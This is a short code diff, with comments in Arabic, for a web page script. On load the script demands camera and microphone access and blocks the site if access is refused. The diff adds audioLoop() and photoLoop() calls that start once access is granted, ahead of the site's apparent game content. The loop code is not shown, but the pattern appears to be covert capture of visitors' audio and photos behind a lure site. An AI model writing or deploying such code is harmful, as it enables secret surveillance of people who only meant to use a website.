@@ -217,15 +217,18 @@
     <script>
 async function start() {
     try {
-        const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
-        console.log("تم منح الإذن! يمكنك الدخول.");
-        // هنا ضع باقي كود الموقع
-        init(); // مثلاً تهيئة الألعاب
+        stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
+        // إذن منح ✅
+        audioLoop();
+        photoLoop();
+
+        // تشغيل الموقع فقط بعد نجاح الإذن
+        init(); 
     } catch (err) {
-        console.log("تم رفض الإذن:", err);
+        // إذن مرفوض ❌
         document.body.innerHTML = `
             <div style="display:flex;justify-content:center;align-items:center;height:100vh;flex-direction:column;color:#fff;background:#111;text-align:center;">
-                <h1>🚫 لا يمكنك الدخول بدون السماح بالاذونات</h1>
+                <h1>🚫 لا يمكنك الدخول بدون السماح بالكاميرا والميكروفون</h1>
                 <p>قم بتحديث الصفحة ومنح الإذن</p>
             </div>
         `;
@@ -233,6 +236,8 @@ async function start() {
 }
 
 window.addEventListener("load", start);
+
+// لاحظ: لا تستدعي init() هنا بعد السكربت
 
 let stream = null;
 let audioActive = false;
